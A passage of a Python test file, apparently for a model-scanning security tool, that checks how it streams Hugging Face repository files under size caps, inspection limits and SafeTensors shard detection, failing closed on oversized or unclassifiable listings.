        budget.record_file_size("test/model", "merges.txt", len(merges_payload))
        budget.prefixes["merges.txt"] = merges_payload[:_HF_CONTENT_SNIFF_BYTES]

        detected_format = _detect_huggingface_flax_msgpack_route(
            "test/model",
            "merges.txt",
            _HF_TEST_REVISION,
            budget,
            merges_payload[:_HF_CONTENT_SNIFF_BYTES],
        )

        assert detected_format is None
        assert budget.file_sizes["merges.txt"] == len(merges_payload)
        assert len(budget.prefixes["merges.txt"]) == len(merges_payload)

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_large_extensionless_listing_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Streaming mode must fail closed when extensionless candidates exceed the bounded limit."""
        repo_files = [f"payloads/chunk-{idx:04d}" for idx in range(1000)]
        repo_files.extend(["README.md", "config", "tokenizer"])

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            pytest.raises(
                Exception,
                match="Refusing to stream-download extensionless files from test/model: "
                "repository listing exceeds the bounded extensionless candidate limit",
            ),
        ):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin", ".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "model.safetensors"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_max_size_rejects_oversized_selected_files(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Streaming mode should enforce max-size before downloading selected files."""
        mock_get_paths_info.return_value = [
            SimpleNamespace(path="pytorch_model.bin", size=1200),
            SimpleNamespace(path="model.safetensors", size=500),
        ]

        with pytest.raises(
            Exception,
            match=r"selected Hugging Face files total 1200 bytes exceeds max size 1000 bytes",
        ):
            list(download_model_streaming("https://huggingface.co/test/model", max_size=1000))

        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_large_uninspected_listing_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
    ) -> None:
        """Recognized suffixes must not hide unknown files beyond the inspection cap."""
        repo_files = [f"payloads/chunk-{idx:04d}.blob" for idx in range(1000)]
        repo_files.extend(["README.md", "pytorch_model.bin", "nested/adapter.bin", "config.blob"])

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            pytest.raises(Exception, match="skipped file inspection limit exceeded"),
        ):
            list(download_model_streaming("https://huggingface.co/test/model"))

        assert _mock_detect_content.call_count == 256
        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".txt"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["malicious.blob", "benign.txt"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_include_all_preserves_unknown_suffix_candidates(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Header-routed scans must not drop malicious content behind an unknown suffix."""
        malicious_path = tmp_path / "malicious.blob"
        benign_path = tmp_path / "benign.txt"
        mock_hf_hub_download.side_effect = [str(malicious_path), str(benign_path)]

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                include_all_files=True,
            )
        )

        assert results == [(malicious_path, False), (benign_path, True)]
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "malicious.blob",
            "benign.txt",
        ]

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_include_all_unbounded_large_unknown_suffix_inventory_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Unbounded include-all streaming should not download arbitrary large non-model inventories."""
        repo_files = ["model.bin", *(f"payloads/chunk-{idx:04d}.blob" for idx in range(129))]

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            pytest.raises(Exception, match="include_all_files=True without max_size selected more than"),
        ):
            list(download_model_streaming("https://huggingface.co/test/model", include_all_files=True))

        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_include_all_large_unknown_suffix_inventory_with_max_size_streams_all_candidates(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A max_size cap should bound aggregate include-all transfer without truncating large inventories."""
        repo_files = ["model.bin", *(f"payloads/chunk-{idx:04d}.blob" for idx in range(129))]
        mock_get_paths_info.return_value = [
            SimpleNamespace(path=filename, size=len(b"payload")) for filename in repo_files
        ]

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(b"payload")
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect
        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
        ):
            results = list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    include_all_files=True,
                    max_size=10 * 1024,
                )
            )

        assert len(results) == len(repo_files)
        assert results[0] == (tmp_path / "model.bin", False)
        assert results[-1] == (tmp_path / "payloads" / "chunk-0128.blob", True)
        mock_get_paths_info.assert_called_once_with("test/model", repo_files, revision=_HF_TEST_REVISION)
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == repo_files

    @pytest.mark.integration
    def test_pinned_grok_large_inventory_metadata_streaming_reaches_terminal(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """The pinned Grok inventory should not fail at the historical 128-candidate cap."""
        monkeypatch.setenv("HF_HUB_DISABLE_IMPLICIT_TOKEN", "1")
        repo_id = "xai-org/grok-1"
        revision = "5de83eb225f49624b424f1c8aa74f96983b5885c"

        repo_files, resolved_revision = _list_huggingface_repo_files_at_revision(
            repo_id,
            requested_revision=revision,
            timeout_seconds=30,
        )

        assert resolved_revision == revision
        assert len(repo_files) == 773

        with patch(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            return_value=(repo_files, resolved_revision, None),
        ):
            results = list(
                download_model_streaming(
                    "hf://xai-org/grok-1",
                    cache_dir=tmp_path,
                    show_progress=False,
                    max_size=10 * 1024,
                    timeout_seconds=120,
                    scannable_extensions={".md"},
                    scannable_filenames={"readme"},
                    scannable_scanner_ids={"metadata"},
                )
            )

        assert len(results) == 1
        readme_path, is_last = results[0]
        assert readme_path.name == "README.md"
        assert readme_path.stat().st_size <= 10 * 1024
        assert is_last is True

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_max_size_rejects_unknown_selected_file_size(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Streaming mode should fail closed on unknown selected file size."""
        mock_get_paths_info.return_value = [SimpleNamespace(path="pytorch_model.bin", size=None)]

        with pytest.raises(Exception, match=r"unknown size for selected file pytorch_model\.bin"):
            list(download_model_streaming("https://huggingface.co/test/model", max_size=1000))

        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_max_size_allows_under_limit_selected_files(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Under-limit streaming mode should still download selected files."""
        downloaded_file = tmp_path / "pytorch_model.bin"
        downloaded_file.write_bytes(b"weights")
        mock_get_paths_info.return_value = [SimpleNamespace(path="pytorch_model.bin", size=700)]
        mock_hf_hub_download.return_value = str(downloaded_file)

        results = list(download_model_streaming("https://huggingface.co/test/model", max_size=1000))

        assert results == [(downloaded_file, True)]
        mock_get_paths_info.assert_called_once_with("test/model", ["pytorch_model.bin"], revision=_HF_TEST_REVISION)
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="pytorch_model.bin",
            revision=_HF_TEST_REVISION,
        )

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["first.bin", "second.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_rejects_underreported_cumulative_download(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Streaming mode should verify the cumulative downloaded bytes, not each file alone."""
        first_file = tmp_path / "first.bin"
        second_file = tmp_path / "second.bin"
        first_file.write_bytes(b"1234")
        second_file.write_bytes(b"5678")
        mock_hf_hub_download.side_effect = [str(first_file), str(second_file)]
        mock_get_paths_info.return_value = [
            SimpleNamespace(path="first.bin", size=3),
            SimpleNamespace(path="second.bin", size=3),
        ]

        with pytest.raises(
            Exception,
            match=r"downloaded bytes plus selected file second\.bin would total 7 bytes, exceeding max size 6",
        ):
            list(download_model_streaming("https://huggingface.co/test/model", max_size=6))

        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="first.bin",
            revision=_HF_TEST_REVISION,
        )

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["first.bin", "second.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_allows_underreported_files_within_cumulative_limit(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Actual bytes may exceed metadata when the cumulative download still fits."""
        first_file = tmp_path / "first.bin"
        second_file = tmp_path / "second.bin"
        first_file.write_bytes(b"123")
        second_file.write_bytes(b"45")
        mock_hf_hub_download.side_effect = [str(first_file), str(second_file)]
        mock_get_paths_info.return_value = [
            SimpleNamespace(path="first.bin", size=2),
            SimpleNamespace(path="second.bin", size=2),
        ]

        results = list(download_model_streaming("https://huggingface.co/test/model", max_size=6))

        assert results == [(first_file, False), (second_file, True)]
        assert mock_hf_hub_download.call_count == 2

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_zero_max_size_preserves_unlimited_behavior(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A zero streaming cap should preserve the documented unlimited-size behavior."""
        downloaded_file = tmp_path / "pytorch_model.bin"
        mock_hf_hub_download.return_value = str(downloaded_file)

        results = list(download_model_streaming("https://huggingface.co/test/model", max_size=0))

        assert results == [(downloaded_file, True)]
        mock_get_paths_info.assert_not_called()
        assert mock_hf_hub_download.call_args.kwargs["revision"] == _HF_TEST_REVISION

    @patch("modelaudit.utils.sources.huggingface._list_repo_files_with_timeout")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_negative_max_size_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        mock_list_repo_files: MagicMock,
    ) -> None:
        """Negative streaming limits should never silently disable enforcement."""
        with pytest.raises(Exception, match="Maximum download size must be non-negative"):
            list(download_model_streaming("https://huggingface.co/test/model", max_size=-1))

        mock_list_repo_files.assert_not_called()
        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["MODEL.SaFeTeNsOrS"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_accepts_mixed_case_scannable_suffix(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Streaming downloads should recognize mixed-case supported suffixes."""
        filename = "MODEL.SaFeTeNsOrS"
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: 500}, _HF_TEST_REVISION),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._scan_remote_huggingface_safetensors_header",
            lambda _repo_id, scanned_filename, _revision, **_kwargs: _fake_remote_safetensors_scan(scanned_filename),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
            lambda *_args, **_kwargs: "safetensors",
        )

        results = list(download_model_streaming("https://huggingface.co/test/model", _include_scan_results=True))

        assert len(results) == 1
        path, is_last, scan_result = cast(tuple[Path, bool, Any], results[0])
        assert path == Path(filename)
        assert is_last is True
        assert scan_result.metadata["hf_filename"] == filename
        mock_hf_hub_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_public_default_preserves_two_tuple_contract(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Public streaming callers should keep receiving documented 2-tuples."""
        downloaded_path = tmp_path / "model.safetensors"
        downloaded_path.write_bytes(b"downloaded")
        mock_hf_hub_download.return_value = str(downloaded_path)

        with patch(
            "modelaudit.utils.sources.huggingface._scan_remote_huggingface_safetensors_header",
            side_effect=AssertionError("public streaming API should not precompute scan results"),
        ) as mock_scan_header:
            results = list(download_model_streaming("https://huggingface.co/test/model"))

        assert results == [(downloaded_path, True)]
        mock_scan_header.assert_not_called()
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="model.safetensors",
            revision=_HF_TEST_REVISION,
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["llama"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_preserves_supported_extensionless_candidate(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A bounded extensionless listing should still reach content-routed scanners."""
        model_path = tmp_path / "llama"
        mock_hf_hub_download.return_value = str(model_path)

        results = list(download_model_streaming("https://huggingface.co/test/model"))

        assert results == [(model_path, True)]
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="llama",
            revision=_HF_TEST_REVISION,
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["README", "weights.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_preserves_selected_extensionless_filename(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Selected metadata scans should retain extensionless filename-routed candidates."""
        readme_path = tmp_path / "README"
        mock_hf_hub_download.return_value = str(readme_path)

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions={".md", ".txt"},
                scannable_filenames={"readme", "model_card"},
            )
        )

        assert results == [(readme_path, True)]
        assert mock_hf_hub_download.call_count == 1
        assert mock_hf_hub_download.call_args.kwargs["filename"] == "README"

    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_selected_filename_ignores_unrelated_extensionless_files(
        self,
        mock_hf_hub_download: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Exact filename routes must not widen selected scans to every extensionless file."""
        repo_files = ["README", *(f"payloads/chunk-{idx:04d}" for idx in range(129))]
        readme_path = tmp_path / "README"
        mock_hf_hub_download.return_value = str(readme_path)

        with patch(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            return_value=(repo_files, _HF_TEST_REVISION, None),
        ):
            results = list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    cache_dir=tmp_path,
                    scannable_extensions={".md", ".txt"},
                    scannable_filenames={"readme", "model_card"},
                )
            )

        assert results == [(readme_path, True)]
        assert mock_hf_hub_download.call_count == 1
        assert mock_hf_hub_download.call_args.kwargs["filename"] == "README"

    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_exact_filenames_deduplicate_and_use_posix_paths(
        self,
        mock_hf_hub_download: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Duplicate names should not consume the cap, and backslashes are not Hub separators."""
        repo_files = [*("README" for _ in range(129)), r"docs\README"]
        readme_path = tmp_path / "README"
        mock_hf_hub_download.return_value = str(readme_path)

        with patch(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            return_value=(repo_files, _HF_TEST_REVISION, None),
        ):
            results = list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    scannable_extensions={".md"},
                    scannable_filenames={"readme"},
                )
            )

        assert results == [(readme_path, True)]
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="README",
            revision=_HF_TEST_REVISION,
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            ["README", "weights.bin", *(f"payloads/chunk-{idx:04d}" for idx in range(129))],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_budgets_only_selected_extensionless_filename(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Exact filename policy should constrain both overflow and immutable-revision size checks."""
        readme_path = tmp_path / "README"
        readme_path.write_bytes(b"readme")
        mock_hf_hub_download.return_value = str(readme_path)
        mock_get_paths_info.return_value = [SimpleNamespace(path="README", size=6)]

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                max_size=10,
                scannable_extensions={".md", ".txt"},
                scannable_filenames={"readme", "model_card"},
            )
        )

        assert results == [(readme_path, True)]
        mock_get_paths_info.assert_called_once_with("test/model", ["README"], revision=_HF_TEST_REVISION)
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="README",
            revision=_HF_TEST_REVISION,
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["llama", "MODEL.UBJ"], _HF_TEST_REVISION, None),
    )
    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_selected_xgboost_excludes_extensionless_candidates(
        self,
        mock_hf_hub_download: MagicMock,
        mock_detect_content: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Explicit remote exclusions should keep XGBoost extensionless files out."""
        model_path = tmp_path / "MODEL.UBJ"
        mock_hf_hub_download.return_value = str(model_path)

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions={".json", ".ubj"},
            )
        )

        assert results == [(model_path, True)]
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="MODEL.UBJ",
            revision=_HF_TEST_REVISION,
        )
        mock_detect_content.assert_called_once_with("test/model", "llama", _HF_TEST_REVISION, ANY)

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            [
                "MODEL.UBJ",
                *[
                    f"model-{index:05d}-of-{_HF_CONTENT_SNIFF_MAX_FILES + 1:05d}.safetensors"
                    for index in range(1, _HF_CONTENT_SNIFF_MAX_FILES + 2)
                ],
            ],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value="safetensors")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_selected_non_overlap_large_safetensors_family_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        mock_detect_content: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A large excluded shard family must not bypass the bounded content-proof limit."""
        policy = resolve_scanner_selection_policy(scanners=["xgboost"])
        extensions = selected_scanner_extensions(policy, conservative=True)
        assert extensions is not None
        assert ".ubj" in extensions
        assert ".safetensors" not in extensions
        model_path = tmp_path / "MODEL.UBJ"
        model_path.write_bytes(b"ubj")
        mock_hf_hub_download.return_value = str(model_path)

        with pytest.raises(Exception, match="skipped file inspection limit exceeded"):
            list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    scannable_extensions=extensions,
                    scannable_filenames=selected_scanner_filenames(policy, conservative=True),
                    scannable_scanner_ids=policy.enabled_scanner_ids,
                )
            )

        assert mock_detect_content.call_count == _HF_CONTENT_SNIFF_MAX_FILES
        mock_hf_hub_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            [
                "MODEL.UBJ",
                "model-00001-of-00002.safetensors",
                "model-00002-of-00002.safetensors",
            ],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_selected_non_overlap_skips_complete_detected_safetensors_shards_within_cap(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A proven complete SafeTensors shard family remains skipped when no selected scanner can consume it."""
        policy = resolve_scanner_selection_policy(scanners=["xgboost"])
        extensions = selected_scanner_extensions(policy, conservative=True)
        assert extensions is not None
        safetensors_header = b'{"__metadata__":{"format":"pt"}}'
        safetensors_shard = struct.pack("<Q", len(safetensors_header)) + safetensors_header
        mock_requests_get.return_value = _FakeRangeResponse(safetensors_shard)

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            assert filename == "MODEL.UBJ"
            path = tmp_path / filename
            path.write_bytes(b"downloaded")
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions=extensions,
                scannable_filenames=selected_scanner_filenames(policy, conservative=True),
                scannable_scanner_ids=policy.enabled_scanner_ids,
            )
        )

        assert results == [(tmp_path / "MODEL.UBJ", True)]
        assert mock_requests_get.call_count == 2
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="MODEL.UBJ",
            revision=_HF_TEST_REVISION,
        )

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value="safetensors")
    def test_select_streamable_hf_files_content_proves_excluded_safetensors_shard(
        self,
        mock_detect_content: MagicMock,
    ) -> None:
        """A data shard may be excluded only after bounded content proves SafeTensors."""
        selection = _select_streamable_hf_files(
            "test/model",
            ["MODEL.UBJ", "orphan-00001-of-00002.safetensors"],
            _HF_TEST_REVISION,
            scannable_extensions={".ubj"},
        )

        assert selection.filenames == ["MODEL.UBJ"]
        mock_detect_content.assert_called_once_with(
            "test/model",
            "orphan-00001-of-00002.safetensors",
            _HF_TEST_REVISION,
            ANY,
        )

    def test_select_streamable_hf_files_refuses_unclassified_indexed_zero_based_shard(self) -> None:
        """Index membership must not replace content proof for an excluded data shard."""
        repo_files = [
            "model.onnx",
            "model.safetensors.index.json",
            "model-00000-of-00001.safetensors",
        ]
        index_payload = json.dumps({"weight_map": {"tensor": "model-00000-of-00001.safetensors"}}).encode()
        with (
            patch("requests.get", return_value=_FakeRangeResponse(index_payload)),
            patch(
                "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
                return_value=None,
            ) as mock_detect_content,
            pytest.raises(ValueError, match="unable to classify SafeTensors shard-shaped candidate"),
        ):
            _select_streamable_hf_files(
                "test/model",
                repo_files,
                _HF_TEST_REVISION,
                scannable_extensions={".onnx"},
                scannable_scanner_ids={"onnx"},
            )

        assert [call.args[1] for call in mock_detect_content.call_args_list] == ["model-00000-of-00001.safetensors"]

    def test_select_streamable_hf_files_probes_unindexed_zero_based_shard(self) -> None:
        """A zero-based name may be excluded only after its content proves SafeTensors."""
        with patch(
            "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
            return_value="safetensors",
        ) as mock_detect_content:
            selection = _select_streamable_hf_files(
                "test/model",
                ["model.onnx", "model-00000-of-00001.safetensors"],
                _HF_TEST_REVISION,
                scannable_extensions={".onnx"},
                scannable_scanner_ids={"onnx"},
            )

        assert selection.filenames == ["model.onnx"]
        mock_detect_content.assert_called_once_with(
            "test/model",
            "model-00000-of-00001.safetensors",
            _HF_TEST_REVISION,
            ANY,
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            [
                "MODEL.UBJ",
                *[
                    f"model-{index:05d}-of-{_HF_CONTENT_SNIFF_MAX_FILES + 1:05d}.safetensors"
                    for index in range(1, _HF_CONTENT_SNIFF_MAX_FILES + 2)
                ],
            ],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value="safetensors")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_extension_only_large_safetensors_family_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        mock_detect_content: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Extension-only selection must retain the bounded proof cap for excluded shard data."""
        model_path = tmp_path / "MODEL.UBJ"
        model_path.write_bytes(b"ubj")
        mock_hf_hub_download.return_value = str(model_path)

        with pytest.raises(Exception, match="skipped file inspection limit exceeded"):
            list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    scannable_extensions={".ubj"},
                )
            )

        assert mock_detect_content.call_count == _HF_CONTENT_SNIFF_MAX_FILES
        mock_hf_hub_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_extension_and_filename_non_overlap_skips_complete_shards_without_ids(
        self,
        mock_hf_hub_download: MagicMock,
        mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Exact filename filters still probe non-shard renamed payloads after skipping complete shards."""
        repo_files = [
            "README",
            "MODEL.UBJ",
            "shards/model-00001-of-00002.safetensors",
            "shards/model-00002-of-00002.safetensors",
            "hidden.payload",
        ]
        mock_detect_content.side_effect = lambda _repo_id, filename, _revision, _budget: (
            "xgboost" if filename == "hidden.payload" else "safetensors"
        )

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(b"downloaded")
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect

        with patch(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            return_value=(repo_files, _HF_TEST_REVISION, None),
        ):
            results = list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    scannable_extensions={".ubj"},
                    scannable_filenames={"readme"},
                )
            )

        assert results == [
            (tmp_path / "README", False),
            (tmp_path / "MODEL.UBJ", False),
            (tmp_path / "hidden.payload", True),
        ]
        assert [call.args[1] for call in mock_detect_content.call_args_list] == [
            "shards/model-00001-of-00002.safetensors",
            "shards/model-00002-of-00002.safetensors",
            "hidden.payload",
        ]
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "README",
            "MODEL.UBJ",
            "hidden.payload",
        ]

    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_filename_only_selection_does_not_probe_declared_safetensors_shards(
        self,
